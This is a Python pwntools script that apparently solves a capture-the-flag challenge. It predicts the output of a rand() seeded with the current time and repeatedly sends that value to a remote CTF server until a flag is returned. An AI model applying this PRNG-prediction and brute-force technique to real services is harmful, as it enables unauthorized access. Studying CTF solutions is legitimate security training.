from pwn import *
context.log_level = "debug"

'''
#filename:get_timecode.py
import time
int(time.time())+60	#timecode
'''

'''
#filename:time_random.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main() {
    int a;
    srand(1616233265);//timecode
    a = rand();
    printf("%d\n", a);
    return 0;
}
'''

payload = p32(648729124)	#time_random

while True:
	# p = process("./easystack")
	p = remote("node2.hackingfor.fun",39669)
	# p.recvuntil("!!\n")
	p.sendline(payload)
	flag = p.recv()
	if "{" in flag or "}" in flag:
		print(flag)
		exit(0)
	else:
		p.close()
		sleep(0.2)